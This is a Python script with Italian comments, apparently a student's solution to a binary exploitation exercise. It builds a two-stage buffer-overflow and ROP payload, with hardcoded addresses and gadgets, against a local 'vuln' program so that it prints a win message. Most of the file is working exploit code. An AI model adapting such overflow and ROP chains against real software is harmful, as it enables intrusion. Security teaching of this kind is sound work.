#note: e` l'exploit 2

import os
import struct

#comando per chiamare: cat badfile badfile1 - | ./vuln

#bisognava stampare "congratulations you win" andando a sfruttare la gets dentro read_file: e poi chiamare la funzione join_string mettendo str2 in str1 e poi chiamando lazy che stampa
#bisogna chiamare read_file tramite la gets in echo() poi dentro read_file devo riuscire a passare l'if (quindi bisogna mettere flag a 1 e mettere magicword al valore richiesto) e nel secondo overflow devo chiamare join_string
#si usa il primo exploit ?

#quindi: echo() deve chiamare read_file() poi read_file() entra nell'if, fa overflow che e` un rop che permette di chiamare join_string() e lazy()

flag = 0x0804a064 #da info variables

#bisogna passare tra funzioni: servono gli indirizzi -> chiamare read_file, join_string e laxy
read_file = 0x80485b9
join_string = 0x80484cb
lazy = 0x804858d

pop_ret = 0x0804834d
pop_pop_ret = 0x080487da
#da info variables
str1 = 0x0804a184
str2 = 0x0804a040

#prima fase di attacco:
#questa prima parte e` esattamente l'exploit di prima pero` invece di mettere lo shellcode nei 120 caratteri metto prima tutte A
payload = "A"*120 #siamo dentro read_file, prendiamo buffer1 e andiamo a sovrascrivere fino a subito prima di p

#dopo i 120 mettiamo la flag dentro la p
payload += struct.pack("I", flag) #dobbiamo entrare nell'indirizzo di flag

##come ha fatto il prof, da capire:
#qui sovrascriviamo read_file

#questo e` il pattern trovato prima di 12*A per andare a sovrascrivere il ret address
#payload += struct.pack("I", read_file)
#payload += struct.pack("I", read_file)
#payload += struct.pack("I", read_file)
#payload += struct.pack("I", read_file)

payload += "B"*12
#nel ret address mettiamo read file:
payload += struct.pack("I", read_file)
#poi la pop_ret
payload += struct.pack("I", pop_ret)
#il valore che vogliamo inserire
payload += struct.pack("I", 0xfefefefe)
#e poi lui faceva payload += struct.pack("B", 0x0a) dove B e` per il format char e metteva 0x0a
#0x0a e` la codifica dello "\n" --> serve a separare i due buffer overflow (sia che siano divisi in due file o che siano nello stesso)
payload += "\n" #e` come dire:
#payload += struct.pack("B", 0x0a)

#//// questo secondo overflow e` un rop che permette di mettere in str2 la nostra frase

#siamo dentro read_file: il num di join_string sufficiente per arrivare a sovrascrivere il return address con join_string, si puo` fare anche con il padding

#buffer overflow su buffer1 in read_file
payload += "B"*68

"""nel mio caso il prof ne metteva troppe:
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", join_string)

payload1 += struct.pack("I", join_string)
payload1 += struct.pack("I", pop_pop_ret)

payload1 += struct.pack("I", str1)
payload1 += struct.pack("I", str2)

#si guarda da qui e l'ordine e` inverso quindi str2 src e str1 dst 
#payload1 += struct.pack("I", lazy)"""

#payload += "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcA"

#arrivo al ret address:
payload += struct.pack("I", join_string)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", str1)
payload += struct.pack("I", str2)

payload += struct.pack("I", lazy)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()

#f = open("badfile1", "a")
#f.write("%s" % payload1)
#f.close()





